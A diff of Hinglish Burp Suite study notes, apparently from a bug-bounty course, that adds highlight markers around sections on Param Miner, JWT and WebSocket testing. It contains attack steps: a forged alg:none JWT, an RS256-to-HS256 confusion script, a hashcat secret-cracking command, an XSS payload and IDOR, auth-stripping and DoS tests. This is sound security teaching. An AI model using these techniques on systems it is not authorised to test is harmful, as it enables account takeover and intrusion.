-**Problem:** Developers often leave debug parameters, testing flags, or hidden features in the code. Ye parameters user ke control mein nahi hote, lekin agar koi attacker unhe guess kar le to sensitive functionality access kar sakta hai. Manually inhe dhundhna impossible hai kyunki hazaron possible names hain.
-**Solution:** Param Miner automatically in parameters ko brute-force karta hai. Agar kisi parameter ka response change hota hai (e.g., different status code, different content length), to wo flag hota hai. Isse potential vulnerabilities ke naye vectors milte hain.
+[[HL::**Problem:** Developers often leave debug parameters, testing flags, or hidden features in the code. Ye parameters user ke control mein nahi hote, lekin agar koi attacker unhe guess kar le to sensitive functionality access kar sakta hai. Manually inhe dhundhna::HL]] [[HL::impossible hai kyunki hazaron possible names hain.::HL]]
+[[HL::**Solution:** Param Miner automatically in parameters ko brute-force karta hai. Agar kisi parameter ka response change hota hai (e.g., different status code, different content length), to wo flag hota hai. Isse potential vulnerabilities ke naye vectors milte hain::HL]].
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
-- **Location:** Install karne ke baad, kisi request par right-click → Extensions → Param Miner → multiple options:
-  - **Guess GET parameters**
-  - **Guess POST parameters**
-  - **Guess headers**
-  - **Guess REST parameters**
-  - **Passive scan** (automatically runs in background)
-- **Appearance:** Passive scan ke results **Scanner → Issue Activity** mein dikhte hain (ya Scanner tab mein). Active scan ke results ek naye tab "Param Miner" mein output ke saath dikhte hain.
-- **Passive scan example:** Jab tum site browse karte ho, Param Miner background mein har request ke response mein dekhta hai ki koi parameter to nahi (like `?cb=123`) jo cache busting kar raha ho. Agar milta hai to issue activity mein "Cache Buster Detected" dikhega.
+- [[HL::**Location:** Install karne ke baad, kisi request par right-click → Extensions → Param Miner → multiple options:::HL]]
+  - [[HL::**Guess GET parameters**::HL]]
+  - [[HL::**Guess POST parameters**::HL]]
+  - [[HL::**Guess headers**::HL]]
+  - [[HL::**Guess REST parameters**::HL]]
+  - [[HL::**Passive scan** (automatically runs in background)::HL]]
+- [[HL::**Appearance:** Passive scan ke results **Scanner → Issue Activity** mein dikhte hain (ya Scanner tab mein). Active scan ke results ek naye tab "Param Miner" mein output ke saath dikhte hain.::HL]]
+- [[HL::**Passive scan example:** Jab tum site browse karte ho, Param Miner background mein har request ke response mein dekhta hai ki koi parameter to nahi (like `?cb=123`) jo cache busting kar raha ho. Agar milta hai to issue activity mein "Cache Buster Detected" dikhega::HL]].
 
 ## ⚙️ 6. Under the Hood (Technical Working):
 **Passive Scan:**
@@ -10575,28 +10575,28 @@ Maano tum ek ghar mein chhupne ki jagah dhundh rahe ho. Tumhe sirf 3 almarian di
 ## 💻 7. Hands-On: Step-by-Step Practical (Active Scan):
 **Step 1: Request select karo**
 ```text
-Proxy history mein kisi bhi request par right-click karo.
-Extensions → Param Miner → "Guess GET parameters" (ya POST/REST accordingly).
+[[HL::Proxy history mein kisi bhi request par right-click karo.::HL]]
+[[HL::Extensions → Param Miner → "Guess GET parameters" (ya POST/REST accordingly).::HL]]
 ```
-**Step 2: Scan start hoga**
+[[HL::**Step 2: Scan start hoga**::HL]]
 ```text
-Ek naya tab "Param Miner" khulega.
-Yahan tum scan progress dekh sakte ho. Wordlist se parameters try ho rahe hain.
+[[HL::Ek naya tab "Param Miner" khulega.::HL]]
+[[HL::Yahan tum scan progress dekh sakte ho. Wordlist se parameters try ho rahe hain.::HL]]
 ```
-**Step 3: Results dekho**
+[[HL::**Step 3: Results dekho**::HL]]
 ```text
-Scan complete hone ke baad, table dikhega:
-| Parameter | Status | Length | Response Preview |
-| test      | 200    | 1234   | ...              |
-| debug     | 500    | 567    | Error...         |
-Jo parameters response change kar rahe hain, un par dhyan do.
+[[HL::Scan complete hone ke baad, table dikhega:::HL]]
+[[HL::| Parameter | Status | Length | Response Preview |::HL]]
+[[HL::| test      | 200    | 1234   | ...              |::HL]]
+[[HL::| debug     | 500    | 567    | Error...         |::HL]]
+[[HL::Jo parameters response change kar rahe hain, un par dhyan do.::HL]]
 ```
-**Step 4: Interesting parameters manually test karo**
+[[HL::**Step 4: Interesting parameters manually test karo**::HL]]
 ```text
-Kisi parameter par click kar ke "Send to Repeater" kar sakte ho.
-Manual testing karo ki ye parameter vulnerable to SQLi/XSS/etc. hai.
+[[HL::Kisi parameter par click kar ke "Send to Repeater" kar sakte ho.::HL]]
+[[HL::Manual testing karo ki ye parameter vulnerable to SQLi/XSS/etc. hai.::HL]]
 ```
-**Step 5: Custom wordlist add karo (optional)**
+**[[HL::Step 5: Custom wordlist add karo (optional::HL]])**
 ```text
 Param Miner options mein tum apni wordlist bhi daal sakte ho.
 Jaise extensions ke options mein jaa kar "Add from file" karo.
@@ -10990,21 +10990,21 @@ Card ke andar kya hai? Thumbprint (signature) aur kuch basic details (user ID, n
 
 ## 📖 3. Technical Definition (Interview Answer)
 
-**JWT (JSON Web Token)** ek compact, URL-safe token hai jo client aur server ke beech information securely transfer karne ke liye use hota hai. Yeh teen parts mein bata hota hai: `header.payload.signature`, har part **Base64Url** encoded hota hai aur signature secret key ya public/private key se sign kiya jata hai.
+[[HL::**JWT (JSON Web Token)** ek compact, URL-safe token hai jo client aur server ke beech information securely transfer karne ke liye use hota hai. Yeh teen parts mein bata hota hai: `header.payload.signature`, har part **Base64Url** encoded hota hai aur signature secret key ya public/private key se sign kiya jata hai.::HL]]
 
-- **Header** – Contains algorithm used (e.g., HS256, RS256) and token type (JWT).
-- **Payload** – Contains claims (data) like user ID, role, expiry time.
-- **Signature** – Header aur payload ko combine karke secret key se sign kiya jata hai taaki pata chal sake ki token tamper toh nahi hua.
+- [[HL::**Header** – Contains algorithm used (e.g., HS256, RS256) and token type (JWT).::HL]]
+- [[HL::**Payload** – Contains claims (data) like user ID, role, expiry time.::HL]]
+- [[HL::**Signature** – Header aur payload ko combine karke secret key se sign kiya jata hai taaki pata chal sake ki token tamper toh nahi hua::HL]].
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?)
 
-**Problem:**  
-Pehle servers session-based authentication use karte the. Jab user login karta tha, server ek session ID create karta, usse memory/database mein store karta, aur client ko cookie bhejta. Har request par server database mein jake check karta ki yeh session valid hai ya nahi. Isse problem ye thi:  
-- **Scalability issue** – agar 10,000 users ek saath aaye, server pe load badh gaya.  
-- **Distributed systems mein dikkat** – agar multiple servers hain, toh sabko same session database share karna padta, ya sticky sessions use karne padte.
+**[[HL::Problem::HL]]:**  
+[[HL::Pehle servers session-based authentication use karte the. Jab user login karta tha, server ek session ID create karta, usse memory/database mein store karta, aur client ko cookie bhejta. Har request par server database mein jake check karta ki yeh session valid hai ya nahi. Isse problem ye thi:::HL]]  
+- [[HL::**Scalability issue** – agar 10,000 users ek saath aaye, server pe load badh gaya.::HL]]  
+- [[HL::**Distributed systems mein dikkat** – agar multiple servers hain, toh sabko same session database share karna padta, ya sticky sessions use karne padte::HL]].
 
-**Solution:**  
-JWT ne yeh problem solve ki. Ab server kuch bhi store nahi karta. Sirf token generate karta hai, client ko de deta hai. Client har request mein token bhejta hai. Server sirf token ka signature check karta hai – "yeh token humne hi banaya hai?" – aur agar sahi hai, toh user authenticated maan leta hai. Database hit zero. **Stateless authentication** ka maza.
+**[[HL::Solution::HL]]:**  
+[[HL::JWT ne yeh problem solve ki. Ab server kuch bhi store nahi karta. Sirf token generate karta hai, client ko de deta hai. Client har request mein token bhejta hai. Server sirf token ka signature check karta hai – "yeh token humne hi banaya hai?" – aur agar sahi hai, toh user authenticated maan leta hai. Database hit zero. **Stateless authentication** ka maza::HL]].
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega
 
@@ -11016,81 +11016,81 @@ Host: example.com
 Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MjUxMjM0NTZ9.2x6x5x7x8x9x0x1x2x3x4x5x6x7x8x9x
 ```
 
-- **`Authorization: Bearer`** ke baad jo lamba sa string hai, woh JWT hai.  
-- Teen parts dots (`.`) se separate hain:  
-  - Pehla part: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` → **Header** (Base64 encoded)  
-  - Doosra part: `eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MjUxMjM0NTZ9` → **Payload** (Base64 encoded)  
-  - Tisra part: `2x6x5x7x8x9x0x1x2x3x4x5x6x7x8x9x` → **Signature**  
+- **[[HL::`Authorization: Bearer` ke baad jo lamba sa string hai, woh JWT hai.::HL]]  
+- [[HL::Teen parts dots (`.`) se separate hain:::HL]]  
+  - [[HL::Pehla part: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` → **Header** (Base64 encoded)::HL]]  
+  - [[HL::Doosra part: `eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MjUxMjM0NTZ9` → **Payload** (Base64 encoded)::HL]]  
+  - [[HL::Tisra part: `2x6x5x7x8x9x0x1x2x3x4x5x6x7x8x9x` → **Signature**::HL]]  
 
-Burp mein agar tum is string ko select karo aur right-click karo → **Send to Decoder**, wahan Base64 decode karke dekh sakte ho.
+[[HL::Burp mein agar tum is string ko select karo aur right-click karo → **Send to Decoder**, wahan Base64 decode karke dekh sakte ho::HL]].
 
 ## ⚙️ 6. Under the Hood (Technical Working)
 
-1. **Client login karta hai** – username/password server ko bhejta hai.  
-2. **Server verify karta hai** credentials, agar sahi hain toh ek JWT banata hai:  
-   - Header banata hai, e.g., `{"alg":"HS256","typ":"JWT"}` → ise Base64Url encode kiya.  
-   - Payload banata hai, e.g., `{"user":"admin","exp":1625123456}` → ise Base64Url encode kiya.  
-   - Dono encoded strings ko dot se jodta hai: `header.payload`  
-   - Is string ko secret key (HS256) ya private key (RS256) se sign karta hai → signature aata hai.  
-   - Final token: `header.payload.signature`  
-3. Server token client ko bhejta hai.  
-4. Client har baar request mein token bhejta hai (usually `Authorization` header mein).  
-5. Server token milte hi:  
-   - Token ko parts mein todta hai.  
-   - Header aur payload ka hash nikalta hai (same algorithm se) aur signature se compare karta hai.  
-   - Agar match kar gaya, token valid maan leta hai.  
-   - Payload se user info nikaal leta hai (e.g., user ID).  
-6. Server database nahi chheerta – bas signature check karta hai. Fast and scalable.
+1. [[HL::**Client login karta hai** – username/password server ko bhejta hai.::HL]]  
+2. [[HL::**Server verify karta hai** credentials, agar sahi hain toh ek JWT banata hai:::HL]]  
+   - [[HL::Header banata hai, e.g., `{"alg":"HS256","typ":"JWT"}` → ise Base64Url encode kiya.::HL]]  
+   - [[HL::Payload banata hai, e.g., `{"user":"admin","exp":1625123456}` → ise Base64Url encode kiya.::HL]]  
+   - [[HL::Dono encoded strings ko dot se jodta hai: `header.payload`::HL]]  
+   - [[HL::Is string ko secret key (HS256) ya private key (RS256) se sign karta hai → signature aata hai.::HL]]  
+   - [[HL::Final token: `header.payload.signature`::HL]]  
+3. [[HL::Server token client ko bhejta hai.::HL]]  
+4. [[HL::Client har baar request mein token bhejta hai (usually `Authorization` header mein).::HL]]  
+5. [[HL::Server token milte hi:::HL]]  
+   - [[HL::Token ko parts mein todta hai.::HL]]  
+   - [[HL::Header aur payload ka hash nikalta hai (same algorithm se) aur signature se compare karta hai.::HL]]  
+   - [[HL::Agar match kar gaya, token valid maan leta hai.::HL]]  
+   - [[HL::Payload se user info nikaal leta hai (e.g., user ID).::HL]]  
+6. [[HL::Server database nahi chheerta – bas signature check karta hai. Fast and scalable::HL]].
 
 ## 💻 7. Hands-On: Step-by-Step Practical (Testing JWT Vulnerabilities)
 
-### Step 1: JWT ko capture karo
-- Burp Proxy on karo, browser mein target website par login karo.  
-- Login request dekho – agar response mein JWT mila toh use capture karo.  
-- Ya kisi authenticated request mein `Authorization: Bearer <token>` header dhundo.
+### [[HL::Step 1: JWT ko capture karo::HL]]
+- [[HL::Burp Proxy on karo, browser mein target website par login karo.::HL]]  
+- [[HL::Login request dekho – agar response mein JWT mila toh use capture karo.::HL]]  
+- [[HL::Ya kisi authenticated request mein `Authorization: Bearer <token>` header dhundo.::HL]]
 
-### Step 2: JWT ko Decode karo
-- Token ko select karo → Right-click → **Send to Decoder**.  
-- Decoder mein, token ko teen parts mein break karo.  
-- Har part ko select karo, phir right-click → **Decode as → Base64**.  
+#[[HL::## Step 2: JWT ko Decode karo::HL]]
+- [[HL::Token ko select karo → Right-click → **Send to Decoder**.::HL]]  
+- [[HL::Decoder mein, token ko teen parts mein break karo.::HL]]  
+- [[HL::Har part ko select karo, phir right-click → **Decode as → Base64**::HL]].  
 - Dekho header aur payload mein kya likha hai.
 
-### Step 3: None Algorithm Attack try karo
-- Token ka header change karo: `{"alg":"none","typ":"JWT"}`  
-- Phir is header ko Base64Url encode karo (dot nahi hatana).  
-- Payload same rakho.  
-- Signature part hata do (ya kuch bhi likh do).  
-- Naya token banake bhejo: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MjUxMjM0NTZ9.`  
-- Agar server accept kar leta hai (200 OK), toh vulnerability hai.
+### [[HL::Step 3: None Algorithm Attack try karo::HL]]
+- [[HL::Token ka header change karo: `{"alg":"none","typ":"JWT"}`::HL]]  
+- [[HL::Phir is header ko Base64Url encode karo (dot nahi hatana).::HL]]  
+- [[HL::Payload same rakho.::HL]]  
+- [[HL::Signature part hata do (ya kuch bhi likh do).::HL]]  
+- [[HL::Naya token banake bhejo: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MjUxMjM0NTZ9.`::HL]]  
+- [[HL::Agar server accept kar leta hai (200 OK), toh vulnerability hai.::HL]]
 
-**Burp mein kaise karein:**  
-- Request ko **Repeater** mein bhejo.  
-- Authorization header mein token replace karo apne modified token se.  
-- Send karo aur response dekho.
+[[HL::**Burp mein kaise karein:**::HL]]  
+- [[HL::Request ko **Repeater** mein bhejo.::HL]]  
+- [[HL::Authorization header mein token replace karo apne modified token se.::HL]]  
+- [[HL::Send karo aur response dekho.::HL]]
 
-### Step 4: Algorithm Confusion Attack (RS256 → HS256)
-- Agar server RS256 use kar raha hai (asymmetric) aur tumhe **public key** mil gayi (e.g., from `/jwks.json`), toh tum public key ko HS256 symmetric key ki tarah use kar sakte ho.  
-- Steps:  
-  a. Public key ko PEM format mein lo.  
-  b. Use tool like `jwt_tool` ya Python script:  
+#[[HL::## Step 4: Algorithm Confusion Attack (RS256 → HS256)::HL]]
+- [[HL::Agar server RS256 use kar raha hai (asymmetric) aur tumhe **public key** mil gayi (e.g., from `/jwks.json`), toh tum public key ko HS256 symmetric key ki tarah use kar sakte ho.::HL]]  
+- [[HL::Steps:::HL]]  
+  [[HL::a. Public key ko PEM format mein lo.::HL]]  
+  [[HL::b. Use tool like `jwt_tool` ya Python script::HL]]:  
   ```python
-  import jwt
-  public_key = open('public.pem').read()
-  token = jwt.encode({'user':'admin'}, public_key, algorithm='HS256')
-  print(token)
+  [[HL::import jwt::HL]]
+  [[HL::public_key = open('public.pem').read()::HL]]
+  [[HL::token = jwt.encode({'user':'admin'}, public_key, algorithm='HS256')::HL]]
+  [[HL::print(token)::HL]]
   ```
-  c. Ye token bhejo – agar server verify kar leta hai, toh vulnerability.
+  [[HL::c. Ye token bhejo – agar server verify kar leta hai, toh vulnerability.::HL]]
 
-### Step 5: Weak HMAC Secret Brute-Force
-- Agar JWT HS256 use kar raha hai, aur secret weak hai (jaise "secret", "password"), toh tum **hashcat** se secret nikal sakte ho.  
-- Command:  
+#[[HL::## Step 5: Weak HMAC Secret Brute-Force::HL]]
+- [[HL::Agar JWT HS256 use kar raha hai, aur secret weak hai (jaise "secret", "password"), toh tum **hashcat** se secret nikal sakte ho.::HL]]  
+- [[HL::Command::HL]]:  
   ```bash
-  hashcat -m 16500 jwt.txt wordlist.txt
+  [[HL::hashcat -m 16500 jwt.txt wordlist.txt::HL]]
   ```  
-  - `-m 16500` = JWT hash mode  
-  - `jwt.txt` mein token daalo  
-  - `wordlist.txt` common secrets ki list  
-- Agar secret mil gaya, tum koi bhi JWT sign kar sakte ho.
+  - [[HL::`-m 16500` = JWT hash mode::HL]]  
+  - [[HL::`jwt.txt` mein token daalo::HL]]  
+  - [[HL::`wordlist.txt` common secrets ki list::HL]]  
+- [[HL::Agar secret mil gaya, tum koi bhi JWT sign kar sakte ho::HL]].
 
 ### Step 6: `kid` Parameter Injection
 - Header mein `kid` (key ID) hota hai jo server batata hai ki kaunsi key use karni hai.  
@@ -11116,23 +11116,23 @@ Burp mein agar tum is string ko select karo aur right-click karo → **Send to D
   **Fix:** Use httpOnly cookies for web apps.  
 - **Mistake 2:** Signature verify karna bhool jana.  
   **Fix:** Always verify signature, don't just decode.  
-- **Mistake 3:** `alg: none` ko allow karna.  
-  **Fix:** Disable `none` algorithm.  
+- [[HL::**Mistake 3:** `alg: none` ko allow karna.::HL]]  
+  [[HL::**Fix:** Disable `none` algorithm::HL]].  
 - **Mistake 4:** Weak secret use karna.  
   **Fix:** Use strong random secret (at least 32 chars).
 
 ## 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier)
 
-- **"Log sochte hain ki JWT encrypted hota hai."**  
-  **Actually:** JWT generally **signed** hota hai, encrypted nahi. Base64 encoded hai, isliye koi bhi decode kar sakta hai. Sensitive data mat rakho payload mein.  
+- **"[[HL::Log sochte hain ki JWT encrypted hota hai."::HL]]**  
+  [[HL::**Actually:** JWT generally **signed** hota hai, encrypted nahi. Base64 encoded hai, isliye koi bhi decode kar sakta hai. Sensitive data mat rakho payload mein::HL]].  
 - **"Log sochte hain ki JWT stateless hai isliye revoke nahi kar sakte."**  
   **Actually:** Tum server pe blacklist rakh sakte ho (stateful) ya token expiry choti rakho. Ya fir database mein token version store karo.
 
 ## 🌍 11. Real-World Use Case (Bug Bounty)
 
-**Scenario:** Ek bade social media platform ka API tha. Unka JWT `alg` header mein tha. Researcher ne `alg: none` karke bheja, server ne accept kar liya. Matlab woh kisi bhi user ban sakta tha.  
-**Result:** Critical bug, $5000 bounty.  
-**How they used it:** Bas token ka header modify kiya, signature hata diya, aur admin endpoints access kar liye.
+[[HL::**Scenario:** Ek bade social media platform ka API tha. Unka JWT `alg` header mein tha. Researcher ne `alg: none` karke bheja, server ne accept kar liya. Matlab woh kisi bhi user ban sakta tha.::HL]]  
+[[HL::**Result:** Critical bug, $5000 bounty.::HL]]  
+[[HL::**How they used it:** Bas token ka header modify kiya, signature hata diya, aur admin endpoints access kar liye::HL]].
 
 ## 🎨 12. Visual Diagram (ASCII Art)
 
@@ -11145,8 +11145,8 @@ Burp mein agar tum is string ko select karo aur right-click karo → **Send to D
 
 ## 🛠️ 13. Best Practices (Pro Tips)
 
-- **Tip 1:** JWT milte hi sabse pehle Base64 decode karo header aur payload.  
-- **Tip 2:** `alg: none` test karna mat bhoolna.  
+- [[HL::**Tip 1:** JWT milte hi sabse pehle Base64 decode karo header aur payload.::HL]]  
+- [[HL::**Tip 2:** `alg: none` test karna mat bhoolna::HL]].  
 - **Tip 3:** `kid` parameter mein path traversal aur SQLi check karo.  
 - **Tip 4:** JWKS URL (`jku`) injection try karo – apna JWKS server bana ke bhejo.  
 - **Tip 5:** JWT signature verify karne ke liye hamesha trusted library use karo, khud mat likho.
@@ -11165,14 +11165,14 @@ A1: Header (algorithm), Payload (data), Signature (verification).
 **Q2: JWT stateless kaise hota hai?**  
 A2: Server token verify karne ke liye database nahi chheerta, bas signature check karta hai.  
 
-**Q3: What is None algorithm attack?**  
-A3: Jab server `alg: none` allow karta hai, toh attacker bina signature ke token bana sakta hai.  
+[[HL::**Q3: What is None algorithm attack?**::HL]]  
+[[HL::A3: Jab server `alg: none` allow karta hai, toh attacker bina signature ke token bana sakta hai::HL]].  
 
 **Q4: RS256 aur HS256 mein kya antar hai?**  
 A4: RS256 asymmetric (public/private key) hai, HS256 symmetric (same secret key).  
 
-**Q5: JWT mein expiry kaise handle karte hain?**  
-A5: Payload mein `exp` claim hota hai, server usse check karta hai.  
+[[HL::**Q5: JWT mein expiry kaise handle karte hain?**::HL]]  
+[[HL::A5: Payload mein `exp` claim hota hai, server usse check karta hai::HL]].  
 
 ## 📝 16. Ek Line Mein Yaad Rakhne Ko (Summary)
 
@@ -11393,85 +11393,85 @@ Socho tum apne dost ke saath **walkie-talkie** par baat kar rahe ho. Tum button 
 
 **WebSocket bhi kuch aisa hi hai.** Jab browser aur server ke beech WebSocket connection establish hota hai, toh dono aapas mein real-time messages bhej sakte hain, bina har baar naya connection banaye. Jaise chat apps, live cricket score, stock prices – ye sab WebSocket se chalte hain.  
 
-**REST** mein har request ke liye naya connection banana padta (jaise phone karke baat karna, phir rakh dena, phir uthana). WebSocket mein ek baar connect karo, phir continuous baat karo.
+[[HL::**REST** mein har request ke liye naya connection banana padta (jaise phone karke baat karna, phir rakh dena, phir uthana). WebSocket mein ek baar connect karo, phir continuous baat karo::HL]].
 
 ## 📖 3. Technical Definition (Interview Answer)
 
-**WebSocket** ek full-duplex communication protocol hai jo client (browser) aur server ke beech persistent connection provide karta hai. HTTP ki tarah request-response nahi, balki dono taraf se real-time messages bheje ja sakte hain. Connection `ws://` (unencrypted) ya `wss://` (encrypted, like HTTPS) se establish hota hai.  
+[[HL::**WebSocket** ek full-duplex communication protocol hai jo client (browser) aur server ke beech persistent connection provide karta hai. HTTP ki tarah request-response nahi, balki dono taraf se real-time messages bheje ja sakte hain. Connection `ws://` (unencrypted) ya `wss://` (encrypted, like HTTPS) se establish hota hai::HL]].  
 
-WebSocket handshake HTTP request se start hota hai jisme `Upgrade: websocket` header hota hai, phir server agree karta hai aur connection protocol switch ho jata hai.
+[[HL::WebSocket handshake HTTP request se start hota hai jisme `Upgrade: websocket` header hota hai, phir server agree karta hai aur connection protocol switch ho jata hai::HL]].
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?)
 
-**Problem:**  
-Pehle real-time features ke liye **polling** karte the – client har 2 second mein server se poochta tha "kuch naya hai?" Isse bandwidth waste hoti thi aur latency zyada thi. Long polling bhi tha but still overhead.
+**[[HL::Problem::HL]]:**  
+[[HL::Pehle real-time features ke liye **polling** karte the – client har 2 second mein server se poochta tha "kuch naya hai?" Isse bandwidth waste hoti thi aur latency zyada thi. Long polling bhi tha but still overhead.::HL]]
 
-**Solution:**  
-WebSocket server ko actively client ko data push karne deta hai jab bhi kuch change ho. Client ko baar-baar request nahi karni padti. Isse real-time apps efficient bante hain – chat, gaming, notifications.
+[[HL::**Solution:**::HL]]  
+[[HL::WebSocket server ko actively client ko data push karne deta hai jab bhi kuch change ho. Client ko baar-baar request nahi karni padti. Isse real-time apps efficient bante hain – chat, gaming, notifications::HL]].
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega
 
-Burp mein WebSocket traffic dekhne ke liye:
+[[HL::Burp mein WebSocket traffic dekhne ke liye:::HL]]
 
-1. **Proxy → WebSockets history** tab par jao.  
-2. Yahan saare WebSocket messages list honge.  
-   - **Direction:** Client to Server ya Server to Client.  
-   - **Payload:** Actual message (text ya binary).  
+1. [[HL::**Proxy → WebSockets history** tab par jao.::HL]]  
+2. [[HL::Yahan saare WebSocket messages list honge.::HL]]  
+   - [[HL::**Direction:** Client to Server ya Server to Client.::HL]]  
+   - [[HL::**Payload:** Actual message (text ya binary).::HL]]  
 
-Intercept karne ke liye:
+[[HL::Intercept karne ke liye:::HL]]
 
-- **Proxy → Intercept** tab mein **WebSocket** sub-tab hota hai.  
-- Yahan check karo **"Intercept WebSocket messages"** checkbox.  
-- Ab jab bhi WebSocket message aayega, Burp rok lega aur tum modify kar sakte ho.
+- [[HL::**Proxy → Intercept** tab mein **WebSocket** sub-tab hota hai.::HL]]  
+- [[HL::Yahan check karo **"Intercept WebSocket messages"** checkbox.::HL]]  
+- [[HL::Ab jab bhi WebSocket message aayega, Burp rok lega aur tum modify kar sakte ho::HL]].
 
 ## ⚙️ 6. Under the Hood (Technical Working)
 
-1. **Handshake:** Client HTTP GET request bhejta hai with headers:  
+1. [[HL::**Handshake:** Client HTTP GET request bhejta hai with headers:::HL]]  
    ```
-   GET /chat HTTP/1.1
-   Host: example.com
-   Upgrade: websocket
-   Connection: Upgrade
-   Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
-   Sec-WebSocket-Version: 13
+   [[HL::GET /chat HTTP/1.1::HL]]
+   [[HL::Host: example.com::HL]]
+   [[HL::Upgrade: websocket::HL]]
+   [[HL::Connection: Upgrade::HL]]
+   [[HL::Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==::HL]]
+   [[HL::Sec-WebSocket-Version: 13::HL]]
    ```
-2. **Server response:** Agar accept karta hai toh:  
+2. [[HL::**Server response:** Agar accept karta hai toh:::HL]]  
    ```
-   HTTP/1.1 101 Switching Protocols
-   Upgrade: websocket
-   Connection: Upgrade
-   Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
+   [[HL::HTTP/1.1 101 Switching Protocols::HL]]
+   [[HL::Upgrade: websocket::HL]]
+   [[HL::Connection: Upgrade::HL]]
+   [[HL::Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk::HL]]=
    ```
-3. Ab connection **upgrade** ho gaya – TCP connection khula rahta hai.  
-4. Dono sides **frames** bhejte hain. Har frame ka ek opcode hota hai (text, binary, close, ping, pong).  
-5. Connection tab tak khula rahta hai jab tak explicitly close na ho.
+3. [[HL::Ab connection **upgrade** ho gaya – TCP connection khula rahta hai.::HL]]  
+4. [[HL::Dono sides **frames** bhejte hain. Har frame ka ek opcode hota hai (text, binary, close, ping, pong).::HL]]  
+5. [[HL::Connection tab tak khula rahta hai jab tak explicitly close na ho::HL]].
 
 ## 💻 7. Hands-On: Step-by-Step Practical (Testing WebSockets)
 
-### Step 1: WebSocket connection capture karo
-- Burp proxy on karo, target website par kisi feature ko use karo jo WebSocket use karta ho (chat, live updates).  
-- **Proxy → WebSockets history** mein check karo – wahan saare messages dikhenge.
+### [[HL::Step 1: WebSocket connection capture karo::HL]]
+- [[HL::Burp proxy on karo, target website par kisi feature ko use karo jo WebSocket use karta ho (chat, live updates).::HL]]  
+- [[HL::**Proxy → WebSockets history** mein check karo – wahan saare messages dikhenge.::HL]]
 
-### Step 2: Intercept WebSocket messages
-- **Proxy → Intercept → WebSocket** sub-tab par jao.  
-- **"Intercept WebSocket messages"** checkbox tick karo.  
-- Ab jab bhi message aayega, Burp rok lega. Tum message modify kar ke **Forward** kar sakte ho, ya **Drop**.
+#[[HL::## Step 2: Intercept WebSocket messages::HL]]
+- [[HL::**Proxy → Intercept → WebSocket** sub-tab par jao.::HL]]  
+- [[HL::**"Intercept WebSocket messages"** checkbox tick karo.::HL]]  
+- [[HL::Ab jab bhi message aayega, Burp rok lega. Tum message modify kar ke **Forward** kar sakte ho, ya **Drop**.::HL]]
 
-### Step 3: Modify message in real-time
-- Maan lo chat app hai. Tum message bhej rahe ho "hello".  
-- Burp ne rok liya. Tum message change kar do "hello<script>alert(1)</script>" – XSS payload.  
-- Forward kar do. Agar server ne reflect kiya ya kisi aur user ko dikhaya, toh XSS ho sakta hai.
+#[[HL::## Step 3: Modify message in real-time::HL]]
+- [[HL::Maan lo chat app hai. Tum message bhej rahe ho "hello".::HL]]  
+- [[HL::Burp ne rok liya. Tum message change kar do "hello<script>alert(1)</script>" – XSS payload.::HL]]  
+- [[HL::Forward kar do. Agar server ne reflect kiya ya kisi aur user ko dikhaya, toh XSS ho sakta hai.::HL]]
 
-### Step 4: Replay WebSocket messages (Repeater)
-- **WebSockets history** mein kisi message par right-click → **Send to Repeater**.  
-- Repeater mein **WebSocket** tab khulega.  
-- Yahan tum message edit kar ke **Send** kar sakte ho. Connection already establish hai, toh direct server tak jayega.  
-- Example: `{"action":"getMessage","id":123}` ko change karo `{"action":"getMessage","id":456}` – IDOR check.
+#[[HL::## Step 4: Replay WebSocket messages (Repeater)::HL]]
+- [[HL::**WebSockets history** mein kisi message par right-click → **Send to Repeater**.::HL]]  
+- [[HL::Repeater mein **WebSocket** tab khulega.::HL]]  
+- [[HL::Yahan tum message edit kar ke **Send** kar sakte ho. Connection already establish hai, toh direct server tak jayega.::HL]]  
+- [[HL::Example: `{"action":"getMessage","id":123}` ko change karo `{"action":"getMessage","id":456}` – IDOR check::HL]].
 
 ### Step 5: Connection manipulation
-- Handshake request ko intercept karo (HTTP request with `Upgrade: websocket`).  
-- Headers modify karo – `Origin` change karo, `Sec-WebSocket-Key` change karo, ya authentication headers hatao.  
-- Agar server bina proper auth connection allow karta hai, toh vulnerability.
+- [[HL::Handshake request ko intercept karo (HTTP request with `Upgrade: websocket`).::HL]]  
+- [[HL::Headers modify karo – `Origin` change karo, `Sec-WebSocket-Key` change karo, ya authentication headers hatao.::HL]]  
+- [[HL::Agar server bina proper auth connection allow karta hai, toh vulnerability::HL]].
 
 ### Step 6: DoS testing
 - Burp ke Repeater mein baar-baar large messages bhejo ya infinite loop mein messages bhejo.  
@@ -11524,8 +11524,8 @@ Intercept karne ke liye:
 
 ## 🛠️ 13. Best Practices (Pro Tips)
 
-- **Tip 1:** WebSocket messages mein hamesha injection try karo – XSS, SQLi, command injection.  
-- **Tip 2:** Authentication bypass ke liye handshake request modify karo – cookies hatao, tokens hatao.  
+- [[HL::**Tip 1:** WebSocket messages mein hamesha injection try karo – XSS, SQLi, command injection.::HL]]  
+- [[HL::**Tip 2:** Authentication bypass ke liye handshake request modify karo – cookies hatao, tokens hatao::HL]].  
 - **Tip 3:** Repeater mein multiple messages bhej kar race conditions check karo.  
 - **Tip 4:** WebSocket connection ko burp ke through proxy karte waqt ensure karo ki WebSocket sub-tab intercept enabled hai.
 
@@ -11537,8 +11537,8 @@ Intercept karne ke liye:
 
